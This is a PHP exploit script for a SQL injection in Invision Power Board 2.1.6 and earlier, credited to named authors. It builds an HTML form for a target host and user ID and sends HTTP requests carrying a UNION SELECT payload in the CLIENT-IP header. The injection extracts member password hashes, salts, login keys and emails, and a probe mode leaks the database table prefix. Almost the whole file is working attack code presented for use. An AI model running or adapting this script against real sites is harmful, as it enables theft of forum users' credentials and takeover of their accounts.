<?
## Invision Power Board <= 2.1.6 "CLIENT_IP" Remote SQL Injection Exploit
## Coded by Cytech (hellknights.void.ru), Vulnerability by 1dt.w0lf (rst.void.ru)

Error_Reporting(E_ALL & ~E_NOTICE);
function SendExploit($host,$port,$exploit,$mode)
{
        $sock = fsockopen($host,$port,$errno,$errstr);
        if (!$sock) echo "\ncant connect to remote server!";
    else
    {
       fputs ($sock,$exploit);
       while (!feof($sock))
       {
        $y0=fgets($sock,9999);
        if($mode == "geterror")
        {
             echo(htmlspecialchars($y0));
        }
        $j = $j.$y0;
       }
    }
        fclose ($sock);

    if($mode == "sqlinject")
    {
        $killhdr=substr($j,strpos($j,"session_id="));
        $killhdz=substr($killhdr,0,strpos($killhdr,'path')  );
        $res = str_replace("session_id=", "\nanswer=", $killhdz);
        echo htmlspecialchars($res);
    }
}

echo<<<EOF
<pre><center><h2>Invision Power Board 2.1.6 "CLIENT_IP" SQL-injection Exploit</h2>[ Coded by Cytech, Vulnerability by 1dt.w0lf ]</center>
<form action="" method="post">
HOST:     <input name="host" size="20" value="hackme.ru">                 * hostname
PORT:     <input name="port" size="20" value="80">                 * httpd`s port
PATH:     <input name="path" size="21" value="/index.php">                * path to forum`s index.php
USERID:   <input name="uname" size="21" value="1">                * username, which data you want to get
PREFIX:   <input name="prefix" size="21" value="ibf_">                * you can get prefix from error (click "geterror")
ROW:      <SELECT name="shellcode">
<OPTION value="ip_address">ip_address (members)</OPTION>
<OPTION value="member_login_key">member_login_key (members)</OPTION>
<OPTION value="id">id (members)</OPTION>
<OPTION value="name">name (members)</OPTION>
<OPTION value="email">email (members)</OPTION>
<OPTION value="legacy_password">GET legacy_password (members)</OPTION>
<OPTION value="converge_pass_hash">converge_pass_hash (members_converge)</OPTION>
<OPTION value="converge_pass_salt">converge_pass_salt (members_converge)</OPTION>
<OPTION value="converge_email">converge_email (members_converge)</OPTION>
</SELECT> * row which you want to get (table)
TABLE:<SELECT name="table">
<OPTION value="members">members</OPTION>
<OPTION value="members_converge">members_converge</OPTION>
</SELECT>                     * please, choose here table eq row which you selected before
<input name="exploit" value="exploit IPB" type="submit">     <input name="geterror" value="check vulnerability & get prefix" type="submit">

[+] shellcode example:  ' UNION SELECT ip_address,0,0,0 FROM ibf_members WHERE id=1/*
</form>
EOF;
            $host         =     $_POST['host'];
        $path         =     $_POST['path'];
               $port         =     $_POST['port'];
        $shellcode      =     $_POST['shellcode'];
        $dbprefix    =    $_POST['prefix'];
        $table        =    $_POST['table'];
        $uname        =    $_POST['uname'];

    echo "\n------------------------------------------------------------------\n";

if(!is_null($_POST['exploit']))
{
    if($_POST['table']=="members") $id = "id"; else $id = "converge_id";
    $injectcode = "' UNION SELECT ".$shellcode.",0,0,0 FROM ".$dbprefix.$table." WHERE ".$id."='".$uname."'/*";
    echo "[+] current used shellcode: $injectcode";
    $exploit  = "GET ".$path."?s=technoid_attacker HTTP/1.1\r\n".
            "TE: deflate,gzip;q=0.3\r\n".
            "Connection: TE, close\r\n".
            "Host: ".$host."\r\n".
            "User-Agent:\r\n".
            "CLIENT-IP: ".$injectcode."\r\n\r\n";

    SendExploit($host,$port,$exploit,"sqlinject");
}

if(!is_null($_POST['geterror']))
{
    $injectcode = " 'technoid-attacker";
    echo "[+] current used shellcode: $injectcode";
    $exploit  = "GET ".$path."?s=technoid_attacker HTTP/1.1\r\n".
            "TE: deflate,gzip;q=0.3\r\n".
            "Connection: TE, close\r\n".
              "Host: ".$host."\r\n".
            "User-Agent:\r\n".
            "CLIENT-IP: ".$injectcode."\r\n\r\n";
    SendExploit($host,$port,$exploit,"geterror");

}
    echo "\n------------------------------------------------------------------\n";
    echo "</pre>";
?>